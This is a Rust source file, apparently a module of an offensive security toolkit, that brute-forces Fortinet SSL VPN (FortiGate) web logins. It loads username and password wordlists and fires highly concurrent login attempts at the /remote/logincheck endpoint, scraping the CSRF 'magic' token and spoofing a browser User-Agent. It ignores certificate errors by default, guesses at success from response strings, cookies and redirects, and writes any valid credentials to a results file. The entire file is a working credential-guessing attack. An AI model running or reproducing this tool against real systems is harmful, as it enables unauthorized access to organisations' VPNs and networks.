use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use reqwest::{ClientBuilder, redirect::Policy};
use std::{
    fs::File,
    io::Write,
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicBool, Ordering},
    time::Duration,
};
use tokio::{
    sync::{Mutex, Semaphore},
    time::{sleep, timeout},
};
use crate::utils::{
    prompt_yes_no, prompt_default, prompt_int_range,
    load_lines, prompt_wordlist, normalize_target,
};
use regex::Regex;
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Fortinet SSL VPN Brute Force Module                     ║".cyan());
    println!("{}", "║   FortiGate Web Login Credential Testing                  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = prompt_default("Fortinet VPN Port", "443").await?
        .parse().unwrap_or(443);

    let usernames_file_path = prompt_wordlist("Username wordlist path").await?;
    let passwords_file_path = prompt_wordlist("Password wordlist path").await?;

    let concurrency = prompt_int_range("Max concurrent tasks", 10, 1, 10000).await? as usize;
    let timeout_secs = prompt_int_range("Connection timeout (seconds)", 10, 1, 300).await? as u64;

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let _save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if _save_results {
        Some(prompt_default("Output file name", "fortinet_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false).await?;
    
    // Optional prompts
    // We don't have prompt_optional in shared utils yet? 
    // Yes we do, implicitly via prompt_default("") or similar, check utils.rs
    // Actually utils has prompt_default. If user enters empty, it returns default. 
    // If we want optional, we might need to rely on prompt_default returning empty string if default is empty?
    // Let's implement a quick local helper or use prompt_default("", "") if that works.
    // The previous code had `prompt_optional`.
    // I will use prompt_default with empty default and check for empty string.
    
    let trusted_cert_str = prompt_default("Trusted certificate SHA256 (optional, press Enter to skip)", "").await?;
    let trusted_cert = if trusted_cert_str.is_empty() { None } else { Some(trusted_cert_str) };

    let realm_str = prompt_default("Authentication realm (optional)", "").await?;
    let realm = if realm_str.is_empty() { None } else { Some(realm_str) };

    let base_url = build_fortinet_url(target, port)?;
    
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());

    println!("\n[*] Starting brute-force on {}", base_url);
    println!("[*] Timeout: {} seconds", timeout_secs);

    let users = load_lines(&usernames_file_path)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", users.len());

    let passwords = load_lines(&passwords_file_path)?;
    if passwords.is_empty() {
        println!("[!] Password wordlist is empty. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", passwords.len());

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let timeout_duration = Duration::from_secs(timeout_secs);

    println!("[*] Testing {} credential combinations", if combo_mode { users.len() * passwords.len() } else { std::cmp::max(users.len(), passwords.len()) });
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();

    // Work generation
    if combo_mode {
        for user in &users {
            for pass in &passwords {
                if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
                
                 spawn_fortinet_task(
                    &mut tasks, &semaphore, 
                    user.clone(), pass.clone(), 
                    base_url.clone(), realm.clone(), trusted_cert.clone(),
                    found_credentials.clone(), stop_signal.clone(), stats.clone(),
                    verbose, stop_on_success, timeout_duration
                ).await;
            }
            if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
        }
    } else {
         let max_len = std::cmp::max(users.len(), passwords.len());
         for i in 0..max_len {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
            let user = &users[i % users.len()];
            let pass = &passwords[i % passwords.len()];
            
            spawn_fortinet_task(
                &mut tasks, &semaphore, 
                user.clone(), pass.clone(), 
                base_url.clone(), realm.clone(), trusted_cert.clone(),
                found_credentials.clone(), stop_signal.clone(), stats.clone(),
                verbose, stop_on_success, timeout_duration
            ).await;
         }
    }

    // Wait for tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
             stats.record_error(format!("Task panic: {}", e)).await;
        }
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final().await;

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (url, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", url, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            if let Ok(mut file) = File::create(&filename) {
                for (url, user, pass) in creds.iter() {
                    let _ = writeln!(file, "{} -> {}:{}", url, user, pass);
                }
                println!("[+] Results saved to '{}'", filename.display());
            }
        }
    }

    Ok(())
}

async fn spawn_fortinet_task(
    tasks: &mut FuturesUnordered<tokio::task::JoinHandle<()>>,
    semaphore: &Arc<Semaphore>,
    user: String,
    pass: String,
    base_url: String,
    realm: Option<String>,
    trusted_cert: Option<String>,
    found: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<BruteforceStats>,
    verbose: bool,
    stop_on_success: bool,
    timeout: Duration
) {
    let permit = semaphore.clone().acquire_owned().await.ok();
    if permit.is_none() { return; }

    tasks.push(tokio::spawn(async move {
        let _permit = permit;
        if stop_on_success && stop_signal.load(Ordering::Relaxed) { return; }

        match try_fortinet_login(&base_url, &user, &pass, &realm, &trusted_cert, timeout).await {
            Ok(true) => {
                println!("\r{}", format!("[+] {} -> {}:{}", base_url, user, pass).green().bold());
                found.lock().await.push((base_url.clone(), user.clone(), pass.clone()));
                stats.record_success();
                if stop_on_success {
                    stop_signal.store(true, Ordering::Relaxed);
                }
            }
            Ok(false) => {
                stats.record_failure();
                if verbose {
                    println!("\r{}", format!("[-] {} -> {}:{}", base_url, user, pass).dimmed());
                }
            }
            Err(e) => {
                stats.record_error(e.to_string()).await;
                if verbose {
                    println!("\r{}", format!("[!] {}: error: {}", base_url, e).red());
                }
            }
        }
        sleep(Duration::from_millis(100)).await;
    }));
}

async fn try_fortinet_login(
    base_url: &str, 
    username: &str, 
    password: &str, 
    realm: &Option<String>,
    trusted_cert: &Option<String>,
    timeout_duration: Duration
) -> Result<bool> {
    let mut client_builder = ClientBuilder::new()
        .cookie_store(true)
        .redirect(Policy::none())
        .timeout(timeout_duration);
    
    if trusted_cert.is_some() {
        client_builder = client_builder
            .danger_accept_invalid_certs(false)
            .danger_accept_invalid_hostnames(false);
    } else {
        client_builder = client_builder
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true);
    }
    
    let client = client_builder
        .build()
        .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

    // Get login page
    let login_page_url = format!("{}/remote/login", base_url);
    
    let login_page_response = match timeout(timeout_duration, client.get(&login_page_url).send()).await {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => return Err(anyhow!("Failed to get login page: {}", e)),
        Err(_) => return Err(anyhow!("Timeout getting login page")),
    };

    let login_page_body = match timeout(timeout_duration, login_page_response.text()).await {
        Ok(Ok(body)) => body,
        Ok(Err(e)) => return Err(anyhow!("Failed to read login page: {}", e)),
        Err(_) => return Err(anyhow!("Timeout reading login page")),
    };

    let csrf_token = extract_csrf_token(&login_page_body);

    // Prepare login form data
    let mut form_data = std::collections::HashMap::new();
    form_data.insert("username", username.to_string());
    form_data.insert("password", password.to_string());
    form_data.insert("ajax", "1".to_string());
    
    if let Some(r) = realm {
        if !r.is_empty() {
            form_data.insert("realm", r.clone());
        }
    }
    
    if let Some(token) = csrf_token {
        form_data.insert("magic", token.clone());
    }

    // Send login request
    let login_url = format!("{}/remote/logincheck", base_url);
    
    let login_response = match timeout(
        timeout_duration,
        client
            .post(&login_url)
            .form(&form_data)
            .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
            .header("Referer", &login_page_url)
            .send()
    ).await {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => return Err(anyhow!("Login request failed: {}", e)),
        Err(_) => return Err(anyhow!("Timeout during login request")),
    };

    let status = login_response.status();
    
    let location_header = login_response.headers().get("Location")
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());
    
    let cookies: Vec<String> = login_response.cookies()
        .map(|c| c.name().to_string())
        .collect();
    
    let has_auth_cookie = cookies.iter().any(|name| {
        let lower = name.to_lowercase();
        lower.contains("session") || lower.contains("svpn") || lower.contains("fortinet")
    });
    
    let response_body = match timeout(timeout_duration, login_response.text()).await {
        Ok(Ok(body)) => body,
        Ok(Err(e)) => return Err(anyhow!("Failed to read login response: {}", e)),
        Err(_) => return Err(anyhow!("Timeout reading login response")),
    };

    // Check for success indicators
    if response_body.contains("redir") 
        || response_body.contains("\"1\"") 
        || response_body.contains("success")
        || response_body.contains("/remote/index")
        || response_body.contains("portal")
    {
        return Ok(true);
    }

    // Check for failure indicators
    if response_body.contains("error") 
        || response_body.contains("invalid") 
        || response_body.contains("failed")
        || response_body.contains("incorrect")
        || response_body.contains("\"0\"")
    {
        return Ok(false);
    }

    // Check status and cookies
    if status.is_success() && has_auth_cookie {
        return Ok(true);
    }

    // Check redirect location
    if status.as_u16() == 302 {
        if let Some(loc_str) = location_header {
            if loc_str.contains("/remote/index") 
                || loc_str.contains("portal")
                || loc_str.contains("index")
            {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

/// Extracts CSRF token from HTML response
fn extract_csrf_token(html: &str) -> Option<String> {
    let patterns = vec![
        r#"name="magic"\s+value="([^"]+)""#,
        r#"name="csrf_token"\s+value="([^"]+)""#,
        r#""magic"\s*:\s*"([^"]+)""#,
        r#"magic=([^&\s"]+)"#,
    ];

    for pattern in patterns {
        if let Ok(re) = Regex::new(pattern) {
            if let Some(captures) = re.captures(html) {
                if let Some(token) = captures.get(1) {
                    return Some(token.as_str().to_string());
                }
            }
        }
    }

    None
}

/// Builds Fortinet VPN URL with proper IPv6 handling
fn build_fortinet_url(target: &str, port: u16) -> Result<String> {
    let normalized_host = normalize_target(target)?;
    
    // Check if port is already present
    let has_port = if normalized_host.starts_with('[') {
        normalized_host.rfind(':').map(|i| i > normalized_host.rfind(']').unwrap_or(0)).unwrap_or(false)
    } else {
        normalized_host.contains(':')
    };
    
    let url = if has_port {
        format!("https://{}", normalized_host)
    } else {
        format!("https://{}:{}", normalized_host, port)
    };
    
    Ok(url)
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    let name = Path::new(input)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    PathBuf::from(format!("./{}", name))
}